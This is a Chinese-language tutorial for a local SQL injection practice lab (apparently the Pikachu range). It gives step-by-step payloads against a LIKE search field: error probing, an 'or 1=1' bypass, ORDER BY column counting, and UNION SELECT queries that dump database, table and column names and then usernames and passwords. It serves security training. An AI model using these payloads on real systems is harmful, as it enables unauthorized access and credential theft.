> 后台原始 SQL：

```
select * from user where username like '%用户输入%'
```

重点：输入被包在 `%...%` 单引号模糊查询中，payload 要闭合前面`%'`，再用`#`注释掉后面剩下的`%'`。

> 
> ⚠️ 仅用于本地靶场练习，严禁用于非授权网站。

## 步骤 1：验证注入

搜索框输入：

```
%'
```

提交，页面出现 MySQL 语法报错，确认存在注入漏洞。

输入万能 payload，查询全部用户：

```
%' or 1=1 #
```

> 
> 拼接后 SQL 变成：

```
select * from user where username like '%' or 1=1 #%'
```

`or 1=1`恒真，# 注释掉后面多余部分，页面返回所有用户数据。

## 步骤 2：order by 判断查询返回的列数

依次测试：

```
%' order by 1 #
%' order by 2 #
%' order by 3 #
%' order by 4 #
```

比如`order by 3`正常，`order by 4`报错 → 说明查询有**3 列**回显位。

## 步骤 3：union 联合查询，爆库名

```
%' union select 1,database(),3 #
```

> 
> 含义：`database()`拿到当前数据库名，放到第 2 个回显位置。

## 步骤 4：爆表名

把`pikachu`替换成上面得到的库名

```
%' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='pikachu' #
```

## 步骤 5：爆字段名

假设得到表名是`users`

```
%' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='pikachu' and table_name='users' #
```

## 步骤 6：读取数据

```
%' union select 1,username,password from users #
```

即可读出账号密码数据。

